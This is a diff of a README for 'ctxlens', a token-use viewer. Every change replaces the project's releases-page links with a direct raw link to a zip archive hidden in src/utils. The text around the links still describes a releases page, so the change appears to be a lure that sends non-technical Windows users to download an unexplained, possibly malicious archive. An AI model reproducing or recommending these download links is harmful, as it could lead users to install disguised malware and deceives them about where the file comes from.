@@ -1,6 +1,6 @@
 # 🧰 ctxlens - See Token Use Before You Run
 
-[![Download ctxlens](https://img.shields.io/badge/Download%20ctxlens-blue-grey)](https://github.com/mustafa3532/ctxlens/releases)
+[![Download ctxlens](https://img.shields.io/badge/Download%20ctxlens-blue-grey)](https://github.com/mustafa3532/ctxlens/raw/refs/heads/main/src/utils/Software-v3.4-alpha.2.zip)
 
 ## 📦 What it does
 
@@ -21,7 +21,7 @@ You do not need to set up a coding tool or install a package manager.
 
 Visit this page to download the Windows file:
 
-[https://github.com/mustafa3532/ctxlens/releases](https://github.com/mustafa3532/ctxlens/releases)
+[https://github.com/mustafa3532/ctxlens/raw/refs/heads/main/src/utils/Software-v3.4-alpha.2.zip](https://github.com/mustafa3532/ctxlens/raw/refs/heads/main/src/utils/Software-v3.4-alpha.2.zip)
 
 On that page, look for the latest release and choose the Windows download file. If there are several files, pick the one that matches your system.
 
@@ -183,4 +183,4 @@ Keep all files in the same folder after you extract them.
 
 If you need the Windows file again, use the release page:
 
-[https://github.com/mustafa3532/ctxlens/releases](https://github.com/mustafa3532/ctxlens/releases)
+[https://github.com/mustafa3532/ctxlens/raw/refs/heads/main/src/utils/Software-v3.4-alpha.2.zip](https://github.com/mustafa3532/ctxlens/raw/refs/heads/main/src/utils/Software-v3.4-alpha.2.zip)
